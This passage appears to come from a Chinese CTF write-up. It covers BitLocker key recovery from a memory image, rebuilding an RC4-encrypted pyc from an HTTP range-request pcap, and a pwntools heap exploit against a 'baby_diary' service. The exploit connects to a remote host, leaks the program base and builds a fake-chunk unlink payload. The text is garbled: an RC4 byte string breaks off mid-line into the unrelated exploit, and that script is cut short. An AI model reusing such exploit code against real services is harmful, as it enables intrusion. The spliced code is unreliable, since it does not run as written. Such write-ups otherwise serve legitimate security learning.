读 bitlocker key
然后⽤ bdemount mount ⼀下
进去看到只有⼀个 README，内容就是 flag。
$ mmls secret
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors
      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000000127   0000000128   Unallocated
002:  000:000   0000000128   0001042559   0001042432   NTFS / exFAT (0x07)
003:  -------   0001042560   0001048575   0000006016   Unallocated
1
2
3
4
5
6
7
8
9
10
$ volatility -f memory --profile Win7SP1x86_23418 bitlocker
Volatility Foundation Volatility Framework 2.6
Address : 0x86863bc8
Cipher  : AES-128
FVEK    : 7c9e29b3708f344e4041271dc54175c5
TWEAK   : 4e3ef340dd377cea9c643951ce1e56c6
1
2
3
4
5
6
7
ExtremelySlow
⾸先使⽤ HTTP header 中的 range 逐字节的下载了⼀个⽂件，由于 response ⾥⾯也有 range，读取所有的 
response 然后拼起来
from pcapng import FileScanner
import pcapng
l = 1987
port_data = {}
file = 'ExtremelySlow.pcapng'
with open(file, 'rb') as fp:
    scanner = FileScanner(fp)
    for block in scanner:
        if isinstance(block, pcapng.blocks.EnhancedPacket):
            data = block.packet_payload_info[2]
            ip_packet = data[14:34]
            src_ip = ip_packet[12:16]
            dst_ip = ip_packet[16:20]
            if src_ip == '\x7f\x00\x00\x01' and dst_ip == 
'\x7f\x00\x00\x01':
                tcp_packet = data[34:66]
                src_port = tcp_packet[0:2]
                dst_port = tcp_packet[2:4]
                if (src_port == '\x00\x50'):
                    http_data = data[66:]
                    if dst_port not in port_data:
                        port_data[dst_port] = [http_data]
                    else:
                        port_data[dst_port].append(http_data)
# print port_data
#exit()
flag = ['\x00'] * 1987
n = 0
# print port_data
for k in port_data:
    for i in range(len(port_data[k]) - 1):
        if ('HTTP' in port_data[k][i]):
            data = port_data[k][i]
            if ('206 Partial' in data):
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
提取出来⼀个 python3.10 的 pyc，⼯具配合⼈⼯逆向字节码恢复部分⽆法识别的代码可以恢复出主要逻
辑（rc4 ⽹上随便抄⼀个）：
                # idx = data[data.index]
                # data = data[66:]
                part1 = data[data.index('content-range: bytes') 
+len('content-range: bytes'):]
                idx = int(part1[:part1.index('-')].strip())
                # print(idx)
                part2 = part1[part1.index('\x0d\x0a\x0d\x0a') + 4:]
                xx = part2
                # print(len(part2))
                if (len(part2) == 0):
                    xx = port_data[k][i+1]
                # print(idx, xx.encode('hex'))
                n += 1
                flag[idx] = xx
flag = ''.join(flag)
print flag.encode('hex')
print n
open('flag.pyc', 'wb').write(flag)
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
import sys
from hashlib import sha256
def KSA(key):
    """This initialises the permutation in array S."""
    keylength = len(key)
    # 256 is the max keylength
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % keylength]) % 256
        #  swap values of S[i] and S[j]
        S[i], S[j] = S[j], S[i]  # swap
    return S
def PRGA(S):
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
    """Initialsises the pseudo-random generator, which takes in values of 
S"""
    Klist = []
    i = 0
    j = 0
    while True:
        # increments i, and looks up the ith element of S, S[i]
        i = (i + 1) % 256
        # which it then adds to j
        j = (j + S[i]) % 256
        # swaps again
        S[i], S[j] = S[j], S[i]  # swap
        # use the sum S[i] + S[j] mod 256 as an index to find a third 
element of S
        K = S[(S[i] + S[j]) % 256]
        # like return, but for generator functions
        yield K
def RC4(key):
    S = KSA(key)
    return PRGA(S)
def xor(p, stream):
    return ''.join(map((lambda x: chr(x ^ stream.__next__())), p))
if __name__ == '__main__':
    w = 
b'\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\x
c8\xf3>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(s))
    p.recvuntil(':')
    p.send(c)
def show(s):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(s))
def dele(s):
    p.recvuntil('>>')
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(s))
def test_check(d):
    res = 0
    for i in d.str():
        res += ord(i)
        res %=0x100
    print(res)
def de_check(d,final = 1):
    res = 0
    for i in d.str():
        res += ord(i)
    for i in range(0x100):
        tmp = res + i
        while tmp > 0xf:
            tmp = (tmp >> 4) + (tmp & 0xf)
        if tmp == final:
            return i
# 224  -11
# p = process('./baby_diary')
# for i in range(22):
#     add(0x10d00,'\xff' * 0x100 + '\n')
# add(0x20000,'aaa\n')
# launch_gdb()
while True:
    try:
        # p = process('./baby_diary')
        p = remote('8.140.114.72', 1399)
        for i in range(22):
            add(0x1000,'\xff'*0x1000)
        add(0x7000000,'aaaa\n')
        show(-11)
        p.recvuntil('\x08')
        break
    except EOFError:
        p.close()
        continue
    # launch_gdb()
leak = u64(b'\x08' + p.recv(5) + b'\x00\x00') - 0x4008
for i in range(23):
    dele(i)
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
# leak = 0x555555554000
log.info('leak prog ' + hex(leak))
payload = p64(0) + p64(0x301) + p64(leak + 0x4060 - 0x18) + p64(leak + 
0x4060 - 0x10)
payload = payload.ljust(0x100,b'\x00')
add(0x108-1,payload + b'\n')
add(0xf8-1,'a\n')
add(0xf8-1,'a\n')
add(0xff0-1,'a\n')
add(0xf8-1,'a\n')